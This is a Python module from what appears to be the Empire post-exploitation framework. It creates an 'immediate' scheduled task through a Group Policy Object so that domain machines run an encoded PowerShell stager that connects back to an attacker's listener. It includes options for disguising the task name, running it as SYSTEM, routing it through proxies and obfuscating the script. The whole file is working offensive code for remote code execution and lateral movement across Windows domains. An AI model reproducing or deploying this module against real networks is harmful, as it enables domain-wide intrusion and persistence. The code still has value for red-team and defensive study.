from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'New-GPOImmediateTask',

            'Author': ['@harmj0y'],

            'Description': ("Builds an 'Immediate' schtask to push out through a specified GPO."),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : True,
            
            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'TaskName' : {
                'Description'   :   'Name for the schtask to create.',
                'Required'      :   True,
                'Value'         :   'Debug'
            },
            'TaskDescription' : {
                'Description'   :   'Name for the schtask to create.',
                'Required'      :   False,
                'Value'         :   'Debugging functionality.'
            },
            'TaskAuthor' : {
                'Description'   :   'Name for the schtask to create.',
                'Required'      :   True,
                'Value'         :   'NT AUTHORITY\System'
            },
            'GPOname' : {
                'Description'   :   'The GPO name to build the task for.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'GPODisplayName' : {
                'Description'   :   'The GPO display name to build the task for.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Domain' : {
                'Description'   :   'The domain to query for the GPOs, defaults to the current domain.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'DomainController' : {
                'Description'   :   'Domain controller to reflect LDAP queries through.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Remove' : {
                'Description'   :   'Switch. Remove the immediate schtask.',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        moduleName = self.info["Name"]
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']

        if not self.mainMenu.listeners.is_listener_valid(listenerName):
            # not a valid listener, return nothing for the script
            print helpers.color("[!] Invalid listener: " + listenerName)
            return ""

        else:

            # generate the PowerShell one-liner with all of the proper options set
            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)

            command = "/c \""+launcher+"\""

            if command == "":
                return ""

            else:

                # read in the common powerview.ps1 module source code
                moduleSource = self.mainMenu.installPath + "/data/module_source/situational_awareness/network/powerview.ps1"
                try:
                    f = open(moduleSource, 'r')
                except:
                    print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
                    return ""

                moduleCode = f.read()
                f.close()

                # get just the code needed for the specified function
                script = helpers.generate_dynamic_powershell_script(moduleCode, moduleName)

                script = moduleName + " -Command cmd -CommandArguments '"+command+"' -Force"

                for option,values in self.options.iteritems():
                    if option.lower() in ["taskname", "taskdescription", "taskauthor", "gponame", "gpodisplayname", "domain", "domaincontroller"]:
                        if values['Value'] and values['Value'] != '':
                            if values['Value'].lower() == "true":
                                # if we're just adding a switch
                                script += " -" + str(option)
                            else:
                                script += " -" + str(option) + " '" + str(values['Value']) + "'"

                script += ' | Out-String | %{$_ + \"`n\"};"`n'+str(moduleName)+' completed!"'
                if obfuscate:
                    script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
                return script
